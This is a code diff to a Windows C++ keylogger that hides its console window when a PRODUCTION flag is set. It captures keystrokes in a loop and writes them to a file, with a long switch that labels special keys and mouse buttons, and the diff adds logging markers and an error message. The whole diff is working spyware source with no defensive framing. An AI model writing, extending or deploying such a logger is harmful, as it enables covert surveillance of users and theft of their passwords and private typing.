@@ -16,6 +16,8 @@ using namespace std;
 #define PRODUCTION false
 
 
+bool IS_LOGGING_RN = false;
+
 bool handle_special_key_press(char key, std::ostream& stream);
 void log(std::ostream&);
 
@@ -29,7 +31,6 @@ int main()
 {
 	// to hide the window
 	ShowWindow(GetConsoleWindow(), PRODUCTION ? SW_HIDE : SW_SHOWNORMAL);
-	cout << "Hello CMake." << endl;
 	cout << "Logging Begins ...." << endl;
 
 	// Getting output stream ready
@@ -42,6 +43,7 @@ int main()
 		log(out_file);
 	}
 	else {
+		cerr << "UNABLE TO OPEN FILE" << endl;
 		// log(cout);
 	}
 
@@ -49,8 +51,16 @@ int main()
 	return 0;
 }
 
+std::string get_time()
+{
+	return "";
+}
+
 void log(std::ostream& Sink)
 {
+	IS_LOGGING_RN = true;
+	Sink << endl << "[LOGGING STARTS]" << endl;
+
 	char key = 0;
 	bool handled_as_special_key = false;
 
@@ -62,11 +72,12 @@ void log(std::ostream& Sink)
 			{
 				handled_as_special_key = handle_special_key_press(key, Sink);
 				if (handled_as_special_key) continue;
-				Sink << key << DELIMITER;
+				Sink << key;
 			}
 		}
 		Sleep(1000);
 	}
+	Sink << "[LOGGING ENDS]" << endl;
 }
 
 inline bool handle_special_key_press(char key, std::ostream& stream)
@@ -74,421 +85,421 @@ inline bool handle_special_key_press(char key, std::ostream& stream)
 	switch (key)
 	{
 	case VK_LBUTTON:
-		stream << "LBUTTON" << DELIMITER;
+		stream << DELIMITER << "[LBUTTON]" << DELIMITER;
 		break;
 	case VK_RBUTTON:
-		stream << "RBUTTON" << DELIMITER;
+		stream << DELIMITER << "[RBUTTON]" << DELIMITER;
 		break;
 	case VK_CANCEL:
-		stream << "CANCEL" << DELIMITER;
+		stream << DELIMITER << "[CANCEL]" << DELIMITER;
 		break;
 	case VK_MBUTTON:
-		stream << "MBUTTON" << DELIMITER;
+		stream << DELIMITER << "[MBUTTON]" << DELIMITER;
 		break;
 	case VK_XBUTTON1:
-		stream << "XBUTTON1" << DELIMITER;
+		stream << DELIMITER << "[XBUTTON1]" << DELIMITER;
 		break;
 	case VK_XBUTTON2:
-		stream << "XBUTTON2" << DELIMITER;
+		stream << DELIMITER << "[XBUTTON2]" << DELIMITER;
 		break;
 	case VK_BACK:
-		stream << "BACK" << DELIMITER;
+		stream << DELIMITER << "[BACK]" << DELIMITER;
 		break;
 	case VK_TAB:
-		stream << "TAB" << DELIMITER;
+		stream << DELIMITER << "[TAB]" << DELIMITER;
 		break;
 	case VK_CLEAR:
-		stream << "CLEAR" << DELIMITER;
+		stream << DELIMITER << "[CLEAR]" << DELIMITER;
 		break;
 	case VK_RETURN:
-		stream << "RETURN" << DELIMITER;
+		stream << DELIMITER << "[RETURN]" << DELIMITER;
 		break;
 	case VK_SHIFT:
-		stream << "SHIFT" << DELIMITER;
+		stream << DELIMITER << "[SHIFT]" << DELIMITER;
 		break;
 	case VK_CONTROL:
-		stream << "CONTROL" << DELIMITER;
+		stream << DELIMITER << "[CONTROL]" << DELIMITER;
 		break;
 	case VK_MENU:
-		stream << "MENU" << DELIMITER;
+		stream << DELIMITER << "[MENU]" << DELIMITER;
 		break;
 	case VK_PAUSE:
-		stream << "PAUSE" << DELIMITER;
+		stream << DELIMITER << "[PAUSE]" << DELIMITER;
 		break;
 	case VK_CAPITAL:
-		stream << "CAPITAL" << DELIMITER;
+		stream << DELIMITER << "[CAPITAL]" << DELIMITER;
 		break;
 	case VK_KANA:
-		stream << "KANA" << DELIMITER;
+		stream << DELIMITER << "[KANA]" << DELIMITER;
 		break;
 		/*case VK_HANGUEL:
-			stream << "HANGUEL" << DELIMITER;
+			stream << DELIMITER << "[HANGUEL]" << DELIMITER;
 			break;
 		case VK_HANGUL:
-			stream << "HANGUL" << DELIMITER;*/
+			stream << DELIMITER << "[HANGUL]" << DELIMITER;*/
 		break;
 	case VK_IME_ON:
-		stream << "IME_ON" << DELIMITER;
+		stream << DELIMITER << "[IME_ON]" << DELIMITER;
 		break;
 	case VK_JUNJA:
-		stream << "JUNJA" << DELIMITER;
+		stream << DELIMITER << "[JUNJA]" << DELIMITER;
 		break;
 	case VK_FINAL:
-		stream << "FINAL" << DELIMITER;
+		stream << DELIMITER << "[FINAL]" << DELIMITER;
 		break;
 	case VK_HANJA:
-		stream << "HANJA" << DELIMITER;
+		stream << DELIMITER << "[HANJA]" << DELIMITER;
 		break;
 		//case VK_KANJI:
-		//	stream << "KANJI" << DELIMITER;
+		//	stream << DELIMITER << "[KANJI]" << DELIMITER;
 		break;
 	case VK_IME_OFF:
-		stream << "IME_OFF" << DELIMITER;
+		stream << DELIMITER << "[IME_OFF]" << DELIMITER;
 		break;
 	case VK_ESCAPE:
-		stream << "ESCAPE" << DELIMITER;
+		stream << DELIMITER << "[ESCAPE]" << DELIMITER;
 		break;
 	case VK_CONVERT:
-		stream << "CONVERT" << DELIMITER;
+		stream << DELIMITER << "[CONVERT]" << DELIMITER;
 		break;
 	case VK_NONCONVERT:
-		stream << "NONCONVERT" << DELIMITER;
+		stream << DELIMITER << "[NONCONVERT]" << DELIMITER;
 		break;
 	case VK_ACCEPT:
-		stream << "ACCEPT" << DELIMITER;
+		stream << DELIMITER << "[ACCEPT]" << DELIMITER;
 		break;
 	case VK_MODECHANGE:
-		stream << "MODECHANGE" << DELIMITER;
+		stream << DELIMITER << "[MODECHANGE]" << DELIMITER;
 		break;
 	case VK_SPACE:
-		stream << "SPACE" << DELIMITER;
+		stream << DELIMITER << "[SPACE]" << DELIMITER;
 		break;
 	case VK_PRIOR:
-		stream << "PRIOR" << DELIMITER;
+		stream << DELIMITER << "[PRIOR]" << DELIMITER;
 		break;
 	case VK_NEXT:
-		stream << "NEXT" << DELIMITER;
+		stream << DELIMITER << "[NEXT]" << DELIMITER;
 		break;
 	case VK_END:
-		stream << "END" << DELIMITER;
+		stream << DELIMITER << "[END]" << DELIMITER;
 		break;
 	case VK_HOME:
-		stream << "HOME" << DELIMITER;
+		stream << DELIMITER << "[HOME]" << DELIMITER;
 		break;
 	case VK_LEFT:
-		stream << "LEFT" << DELIMITER;
+		stream << DELIMITER << "[LEFT]" << DELIMITER;
 		break;
 	case VK_UP:
-		stream << "UP" << DELIMITER;
+		stream << DELIMITER << "[UP]" << DELIMITER;
 		break;
 	case VK_RIGHT:
-		stream << "RIGHT" << DELIMITER;
+		stream << DELIMITER << "[RIGHT]" << DELIMITER;
 		break;
 	case VK_DOWN:
-		stream << "DOWN" << DELIMITER;
+		stream << DELIMITER << "[DOWN]" << DELIMITER;
 		break;
 	case VK_SELECT:
-		stream << "SELECT" << DELIMITER;
+		stream << DELIMITER << "[SELECT]" << DELIMITER;
 		break;
 	case VK_PRINT:
-		stream << "PRINT" << DELIMITER;
+		stream << DELIMITER << "[PRINT]" << DELIMITER;
 		break;
 	case VK_EXECUTE:
-		stream << "EXECUTE" << DELIMITER;
+		stream << DELIMITER << "[EXECUTE]" << DELIMITER;
 		break;
 	case VK_SNAPSHOT:
-		stream << "SNAPSHOT" << DELIMITER;
+		stream << DELIMITER << "[SNAPSHOT]" << DELIMITER;
 		break;
 	case VK_INSERT:
-		stream << "INSERT" << DELIMITER;
+		stream << DELIMITER << "[INSERT]" << DELIMITER;
 		break;
 	case VK_DELETE:
-		stream << "DELETE" << DELIMITER;
+		stream << DELIMITER << "[DELETE]" << DELIMITER;
 		break;
 	case VK_HELP:
-		stream << "HELP" << DELIMITER;
+		stream << DELIMITER << "[HELP]" << DELIMITER;
 		break;
 	case VK_LWIN:
-		stream << "LWIN" << DELIMITER;
+		stream << DELIMITER << "[LWIN]" << DELIMITER;
 		break;
 	case VK_RWIN:
-		stream << "RWIN" << DELIMITER;
+		stream << DELIMITER << "[RWIN]" << DELIMITER;
 		break;
 	case VK_APPS:
-		stream << "APPS" << DELIMITER;
+		stream << DELIMITER << "[APPS]" << DELIMITER;
 		break;
 	case VK_SLEEP:
-		stream << "SLEEP" << DELIMITER;
+		stream << DELIMITER << "[SLEEP]" << DELIMITER;
 		break;
 	case VK_NUMPAD0:
-		stream << "NUMPAD0" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD0]" << DELIMITER;
 		break;
 	case VK_NUMPAD1:
-		stream << "NUMPAD1" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD1]" << DELIMITER;
 		break;
 	case VK_NUMPAD2:
-		stream << "NUMPAD2" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD2]" << DELIMITER;
 		break;
 	case VK_NUMPAD3:
-		stream << "NUMPAD3" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD3]" << DELIMITER;
 		break;
 	case VK_NUMPAD4:
-		stream << "NUMPAD4" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD4]" << DELIMITER;
 		break;
 	case VK_NUMPAD5:
-		stream << "NUMPAD5" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD5]" << DELIMITER;
 		break;
 	case VK_NUMPAD6:
-		stream << "NUMPAD6" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD6]" << DELIMITER;
 		break;
 	case VK_NUMPAD7:
-		stream << "NUMPAD7" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD7]" << DELIMITER;
 		break;
 	case VK_NUMPAD8:
-		stream << "NUMPAD8" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD8]" << DELIMITER;
 		break;
 	case VK_NUMPAD9:
-		stream << "NUMPAD9" << DELIMITER;
+		stream << DELIMITER << "[NUMPAD9]" << DELIMITER;
 		break;
 	case VK_MULTIPLY:
-		stream << "MULTIPLY" << DELIMITER;
+		stream << DELIMITER << "[MULTIPLY]" << DELIMITER;
 		break;
 	case VK_ADD:
-		stream << "ADD" << DELIMITER;
+		stream << DELIMITER << "[ADD]" << DELIMITER;
 		break;
 	case VK_SEPARATOR:
-		stream << "SEPARATOR" << DELIMITER;
+		stream << DELIMITER << "[SEPARATOR]" << DELIMITER;
 		break;
 	case VK_SUBTRACT:
-		stream << "SUBTRACT" << DELIMITER;
+		stream << DELIMITER << "[SUBTRACT]" << DELIMITER;
 		break;
 	case VK_DECIMAL:
-		stream << "DECIMAL" << DELIMITER;
+		stream << DELIMITER << "[DECIMAL]" << DELIMITER;
 		break;
 	case VK_DIVIDE:
-		stream << "DIVIDE" << DELIMITER;
+		stream << DELIMITER << "[DIVIDE]" << DELIMITER;
 		break;
 	case VK_F1:
-		stream << "F1" << DELIMITER;
+		stream << DELIMITER << "[F1]" << DELIMITER;
 		break;
 	case VK_F2:
-		stream << "F2" << DELIMITER;
+		stream << DELIMITER << "[F2]" << DELIMITER;
 		break;
 	case VK_F3:
-		stream << "F3" << DELIMITER;
+		stream << DELIMITER << "[F3]" << DELIMITER;
 		break;
 	case VK_F4:
-		stream << "F4" << DELIMITER;
+		stream << DELIMITER << "[F4]" << DELIMITER;
 		break;
 	case VK_F5:
-		stream << "F5" << DELIMITER;
+		stream << DELIMITER << "[F5]" << DELIMITER;
 		break;
 	case VK_F6:
-		stream << "F6" << DELIMITER;
+		stream << DELIMITER << "[F6]" << DELIMITER;
 		break;
 	case VK_F7:
-		stream << "F7" << DELIMITER;
+		stream << DELIMITER << "[F7]" << DELIMITER;
 		break;
 	case VK_F8:
-		stream << "F8" << DELIMITER;
+		stream << DELIMITER << "[F8]" << DELIMITER;
 		break;
 	case VK_F9:
-		stream << "F9" << DELIMITER;
+		stream << DELIMITER << "[F9]" << DELIMITER;
 		break;
 	case VK_F10:
-		stream << "F10" << DELIMITER;
+		stream << DELIMITER << "[F10]" << DELIMITER;
 		break;
 	case VK_F11:
-		stream << "F11" << DELIMITER;
+		stream << DELIMITER << "[F11]" << DELIMITER;
 		break;
 	case VK_F12:
-		stream << "F12" << DELIMITER;
+		stream << DELIMITER << "[F12]" << DELIMITER;
 		break;
 	case VK_F13:
-		stream << "F13" << DELIMITER;
+		stream << DELIMITER << "[F13]" << DELIMITER;
 		break;
 	case VK_F14:
-		stream << "F14" << DELIMITER;
+		stream << DELIMITER << "[F14]" << DELIMITER;
 		break;
 	case VK_F15:
-		stream << "F15" << DELIMITER;
+		stream << DELIMITER << "[F15]" << DELIMITER;
 		break;
 	case VK_F16:
-		stream << "F16" << DELIMITER;
+		stream << DELIMITER << "[F16]" << DELIMITER;
 		break;
 	case VK_F17:
-		stream << "F17" << DELIMITER;
+		stream << DELIMITER << "[F17]" << DELIMITER;
 		break;
 	case VK_F18:
-		stream << "F18" << DELIMITER;
+		stream << DELIMITER << "[F18]" << DELIMITER;
 		break;
 	case VK_F19:
-		stream << "F19" << DELIMITER;
+		stream << DELIMITER << "[F19]" << DELIMITER;
 		break;
 	case VK_F20:
-		stream << "F20" << DELIMITER;
+		stream << DELIMITER << "[F20]" << DELIMITER;
 		break;
 	case VK_F21:
-		stream << "F21" << DELIMITER;
+		stream << DELIMITER << "[F21]" << DELIMITER;
 		break;
 	case VK_F22:
-		stream << "F22" << DELIMITER;
+		stream << DELIMITER << "[F22]" << DELIMITER;
 		break;
 	case VK_F23:
-		stream << "F23" << DELIMITER;
+		stream << DELIMITER << "[F23]" << DELIMITER;
 		break;
 	case VK_F24:
-		stream << "F24" << DELIMITER;
+		stream << DELIMITER << "[F24]" << DELIMITER;
 		break;
 	case VK_NUMLOCK:
-		stream << "NUMLOCK" << DELIMITER;
+		stream << DELIMITER << "[NUMLOCK]" << DELIMITER;
 		break;
 	case VK_SCROLL:
-		stream << "SCROLL" << DELIMITER;
+		stream << DELIMITER << "[SCROLL]" << DELIMITER;
 		break;
 	case VK_LSHIFT:
-		stream << "LSHIFT" << DELIMITER;
+		stream << DELIMITER << "[LSHIFT]" << DELIMITER;
 		break;
 	case VK_RSHIFT:
-		stream << "RSHIFT" << DELIMITER;
+		stream << DELIMITER << "[RSHIFT]" << DELIMITER;
 		break;
 	case VK_LCONTROL:
-		stream << "LCONTROL" << DELIMITER;
+		stream << DELIMITER << "[LCONTROL]" << DELIMITER;
 		break;
 	case VK_RCONTROL:
-		stream << "RCONTROL" << DELIMITER;
+		stream << DELIMITER << "[RCONTROL]" << DELIMITER;
 		break;
 	case VK_LMENU:
-		stream << "LMENU" << DELIMITER;
+		stream << DELIMITER << "[LMENU]" << DELIMITER;
 		break;
 	case VK_RMENU:
-		stream << "RMENU" << DELIMITER;
+		stream << DELIMITER << "[RMENU]" << DELIMITER;
 		break;
 	case VK_BROWSER_BACK:
-		stream << "BROWSER_BACK" << DELIMITER;
+		stream << DELIMITER << "[BROWSER_BACK]" << DELIMITER;
 		break;
 	case VK_BROWSER_FORWARD:
-		stream << "BROWSER_FORWARD" << DELIMITER;
+		stream << DELIMITER << "[BROWSER_FORWARD]" << DELIMITER;
 		break;
 	case VK_BROWSER_REFRESH:
-		stream << "BROWSER_REFRESH" << DELIMITER;
+		stream << DELIMITER << "[BROWSER_REFRESH]" << DELIMITER;
 		break;
 	case VK_BROWSER_STOP:
-		stream << "BROWSER_STOP" << DELIMITER;
+		stream << DELIMITER << "[BROWSER_STOP]" << DELIMITER;
 		break;
 	case VK_BROWSER_SEARCH:
-		stream << "BROWSER_SEARCH" << DELIMITER;
+		stream << DELIMITER << "[BROWSER_SEARCH]" << DELIMITER;
 		break;
 	case VK_BROWSER_FAVORITES:
-		stream << "BROWSER_FAVORITES" << DELIMITER;
+		stream << DELIMITER << "[BROWSER_FAVORITES]" << DELIMITER;
 		break;
 	case VK_BROWSER_HOME:
-		stream << "BROWSER_HOME" << DELIMITER;
+		stream << DELIMITER << "[BROWSER_HOME]" << DELIMITER;
 		break;
 	case VK_VOLUME_MUTE:
-		stream << "VOLUME_MUTE" << DELIMITER;
+		stream << DELIMITER << "[VOLUME_MUTE]" << DELIMITER;
 		break;
 	case VK_VOLUME_DOWN:
-		stream << "VOLUME_DOWN" << DELIMITER;
+		stream << DELIMITER << "[VOLUME_DOWN]" << DELIMITER;
 		break;
 	case VK_VOLUME_UP:
-		stream << "VOLUME_UP" << DELIMITER;
+		stream << DELIMITER << "[VOLUME_UP]" << DELIMITER;
 		break;
 	case VK_MEDIA_NEXT_TRACK:
-		stream << "MEDIA_NEXT_TRACK" << DELIMITER;
+		stream << DELIMITER << "[MEDIA_NEXT_TRACK]" << DELIMITER;
 		break;
 	case VK_MEDIA_PREV_TRACK:
-		stream << "MEDIA_PREV_TRACK" << DELIMITER;
+		stream << DELIMITER << "[MEDIA_PREV_TRACK]" << DELIMITER;
 		break;
 	case VK_MEDIA_STOP:
-		stream << "MEDIA_STOP" << DELIMITER;
+		stream << DELIMITER << "[MEDIA_STOP]" << DELIMITER;
 		break;
 	case VK_MEDIA_PLAY_PAUSE:
-		stream << "MEDIA_PLAY_PAUSE" << DELIMITER;
+		stream << DELIMITER << "[MEDIA_PLAY_PAUSE]" << DELIMITER;
 		break;
 	case VK_LAUNCH_MAIL:
-		stream << "LAUNCH_MAIL" << DELIMITER;
+		stream << DELIMITER << "[LAUNCH_MAIL]" << DELIMITER;
 		break;
 	case VK_LAUNCH_MEDIA_SELECT:
-		stream << "LAUNCH_MEDIA_SELECT" << DELIMITER;
+		stream << DELIMITER << "[LAUNCH_MEDIA_SELECT]" << DELIMITER;
 		break;
 	case VK_LAUNCH_APP1:
-		stream << "LAUNCH_APP1" << DELIMITER;
+		stream << DELIMITER << "[LAUNCH_APP1]" << DELIMITER;
 		break;
 	case VK_LAUNCH_APP2:
-		stream << "LAUNCH_APP2" << DELIMITER;
+		stream << DELIMITER << "[LAUNCH_APP2]" << DELIMITER;
 		break;
 	case VK_OEM_1:
-		stream << "OEM_1" << DELIMITER;
+		stream << DELIMITER << "[OEM_1]" << DELIMITER;
 		break;
 	case VK_OEM_PLUS:
-		stream << "OEM_PLUS" << DELIMITER;
+		stream << DELIMITER << "[OEM_PLUS]" << DELIMITER;
 		break;
 	case VK_OEM_COMMA:
-		stream << "OEM_COMMA" << DELIMITER;
+		stream << DELIMITER << "[OEM_COMMA]" << DELIMITER;
 		break;
 	case VK_OEM_MINUS:
-		stream << "OEM_MINUS" << DELIMITER;
+		stream << DELIMITER << "[OEM_MINUS]" << DELIMITER;
 		break;
 	case VK_OEM_PERIOD:
-		stream << "OEM_PERIOD" << DELIMITER;
+		stream << DELIMITER << "[OEM_PERIOD]" << DELIMITER;
 		break;
 	case VK_OEM_2:
-		stream << "OEM_2" << DELIMITER;
+		stream << DELIMITER << "[OEM_2]" << DELIMITER;
 		break;
 	case VK_OEM_3:
-		stream << "OEM_3" << DELIMITER;
+		stream << DELIMITER << "[OEM_3]" << DELIMITER;
 		break;
 	case VK_OEM_4:
-		stream << "OEM_4" << DELIMITER;
+		stream << DELIMITER << "[OEM_4]" << DELIMITER;
 		break;
 	case VK_OEM_5:
-		stream << "OEM_5" << DELIMITER;
+		stream << DELIMITER << "[OEM_5]" << DELIMITER;
 		break;
 	case VK_OEM_6:
-		stream << "OEM_6" << DELIMITER;
+		stream << DELIMITER << "[OEM_6]" << DELIMITER;
 		break;
 	case VK_OEM_7:
-		stream << "OEM_7" << DELIMITER;
+		stream << DELIMITER << "[OEM_7]" << DELIMITER;
 		break;
 	case VK_OEM_8:
-		stream << "OEM_8" << DELIMITER;
+		stream << DELIMITER << "[OEM_8]" << DELIMITER;
 		break;
 	case VK_OEM_102:
-		stream << "OEM_102" << DELIMITER;
+		stream << DELIMITER << "[OEM_102]" << DELIMITER;
 		break;
 	case VK_PROCESSKEY:
-		stream << "PROCESSKEY" << DELIMITER;
+		stream << DELIMITER << "[PROCESSKEY]" << DELIMITER;
 		break;
 	case VK_PACKET:
-		stream << "PACKET" << DELIMITER;
+		stream << DELIMITER << "[PACKET]" << DELIMITER;
 		break;
 	case VK_ATTN:
-		stream << "ATTN" << DELIMITER;
+		stream << DELIMITER << "[ATTN]" << DELIMITER;
 		break;
 	case VK_CRSEL:
-		stream << "CRSEL" << DELIMITER;
+		stream << DELIMITER << "[CRSEL]" << DELIMITER;
 		break;
 	case VK_EXSEL:
-		stream << "EXSEL" << DELIMITER;
+		stream << DELIMITER << "[EXSEL]" << DELIMITER;
 		break;
 	case VK_EREOF:
-		stream << "EREOF" << DELIMITER;
+		stream << DELIMITER << "[EREOF]" << DELIMITER;
 		break;
 	case VK_PLAY:
-		stream << "PLAY" << DELIMITER;
+		stream << DELIMITER << "[PLAY]" << DELIMITER;
 		break;
 	case VK_ZOOM:
-		stream << "ZOOM" << DELIMITER;
+		stream << DELIMITER << "[ZOOM]" << DELIMITER;
 		break;
 	case VK_NONAME:
-		stream << "NONAME" << DELIMITER;
+		stream << DELIMITER << "[NONAME]" << DELIMITER;
 		break;
 	case VK_PA1:
-		stream << "PA1" << DELIMITER;
+		stream << DELIMITER << "[PA1]" << DELIMITER;
 		break;
 	case VK_OEM_CLEAR:
-		stream << "OEM_CLEAR" << DELIMITER;
+		stream << DELIMITER << "[OEM_CLEAR]" << DELIMITER;
 		break;
 	default:
 		return false;
